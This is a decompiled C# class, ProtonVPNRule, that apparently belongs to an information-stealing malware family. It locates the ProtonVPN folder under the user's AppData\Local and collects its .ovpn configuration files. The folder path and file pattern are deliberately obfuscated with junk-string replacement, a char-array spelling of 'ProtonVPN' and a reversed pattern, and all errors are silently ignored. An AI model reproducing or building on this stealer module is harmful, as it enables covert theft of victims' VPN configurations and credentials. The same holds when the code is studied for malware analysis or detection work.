using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000022 RID: 34
public class ProtonVPNRule : FileScannerRule
{
	// Token: 0x06000086 RID: 134 RVA: 0x000059B3 File Offset: 0x00003BB3
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00006248 File Offset: 0x00004448
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPstring.ReplaceROFILE%\\Apstring.ReplacepData\\Locastring.Replacel").Replace("string.Replace", string.Empty), new string(new char[]
				{
					'P',
					'r',
					'o',
					't',
					'o',
					'n',
					'V',
					'P',
					'N'
				})),
				Pattern = new string("npvo*".Reverse<char>().ToArray<char>()),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
